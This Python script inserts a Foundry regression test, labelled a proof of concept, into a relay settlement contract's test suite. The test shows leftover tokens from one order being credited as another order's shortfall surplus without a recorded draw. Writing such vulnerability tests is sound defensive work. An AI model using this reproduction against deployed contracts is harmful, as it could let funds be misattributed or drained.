from pathlib import Path

target = Path("relay-settlement/contracts/relay-chain/test/PoolResolvers/PoolDrawResolver.t.sol")
source = target.read_text()
marker = "  function test_fixedLegConversionBelowMinimumReverts() public {"
if "test_crossOrderResidualCanBeCreditedAsAnotherOrdersShortfallSurplus" in source:
    raise SystemExit("PoC already injected")
if marker not in source:
    raise SystemExit("Expected insertion point not found; refusing to patch a different source layout")

test = r"""
  function test_crossOrderResidualCanBeCreditedAsAnotherOrdersShortfallSurplus() public {
    // Order A leaves an intermediate token in the persistent resolver.
    // That token is neither Order A's request input nor request output.
    address orderA = otherAccounts[3];
    uint256 residualTokenId = Utils.generateTokenId(
      OUT_CHAIN_ID,
      abi.encodePacked(address(3))
    );
    vm.startPrank(owner);
    hub.mint(owner, residualTokenId, 1);
    hub.burn(owner, residualTokenId, 1);
    hub.mint(orderA, tokenInId, 100);
    vm.stopPrank();
    address residualToken = hub.erc20Views(residualTokenId);

    Call[] memory fixedCalls = new Call[](2);
    fixedCalls[0] = Call({
      to: address(externalToken),
      data: abi.encodeCall(IERC20.approve, (address(externalSwapper), 15))
    });
    fixedCalls[1] = Call({
      to: address(externalSwapper),
      data: abi.encodeCall(
        DrawResolverExternalToHubSwapper.swap,
        (address(externalToken), residualTokenId, 15, 10)
      )
    });

    DrawLeg[] memory firstLegs = new DrawLeg[](1);
    firstLegs[0] = DrawLeg({
      pool: address(pool),
      account: app,
      kind: DrawLegKind.FIXED,
      tokenIn: address(externalToken),
      tokenOut: residualToken,
      amount: 20,
      amountOutMinimum: 10,
      calls: fixedCalls
    });
    Call[] memory firstCalls = new Call[](1);
    firstCalls[0] = _hubSwap(tokenInId, tokenOutId, 100, 100);
    _execute(
      _request(
        orderA,
        100,
        _prepare(orderA, firstLegs, firstCalls, bytes32(uint256(0xA1)))
      )
    );

    // The 10 residual tokens survive because _settleRequestTokens only
    // settles Order A's request input/output token pair.
    assertEq(IERC20(residualToken).balanceOf(address(drawResolver)), 10);
    // App A funded the conversion: 20 units were debited, 5 unused units
    // were returned, leaving its external-token pool balance down by 15.
    assertEq(pool.balances(app, address(externalToken)), 85);

    // Order B's shortfall leg names that same token and a different account.
    address orderB = otherAccounts[4];
    _depositHubToken(platform, residualTokenId, residualToken, 100);
    _configureAccount(platform, residualToken, 50);
    vm.prank(owner);
    hub.mint(orderB, tokenInId, 100);

    DrawLeg[] memory secondLegs = new DrawLeg[](1);
    secondLegs[0] = _shortfallLeg(platform, residualToken, 5);
    Call[] memory secondCalls = new Call[](1);
    secondCalls[0] = _hubSwap(tokenInId, tokenOutId, 100, 100);
    ExecuteAndWithdrawRequest memory secondRequest = _request(
      orderB,
      100,
      _prepare(orderB, secondLegs, secondCalls, bytes32(uint256(0xB1)))
    );
    // A third-party relayer can submit the exact, already oracle- and
    // account-authorized payload; it cannot mutate the committed plan.
    vm.prank(otherAccounts[5]);
    executor.execute(
      secondRequest,
      address(drawResolver),
      preparedPayload,
      oracleSigner,
      _signRequest(secondRequest)
    );

    // The resolver treats 10 old tokens as Order B's output, credits 5 to
    // Order B's platform account, and does so without a draw for Order B.
    assertEq(pool.balances(platform, residualToken), 105);
    assertEq(pool.orderDraws(orderB, platform, residualToken), 0);
    assertFalse(pool.drawRecords(orderB, platform, 0));
    assertEq(IERC20(residualToken).balanceOf(address(drawResolver)), 5);
  }

"""
target.write_text(source.replace(marker, test + marker, 1))
print(f"Injected targeted regression PoC into {target}")
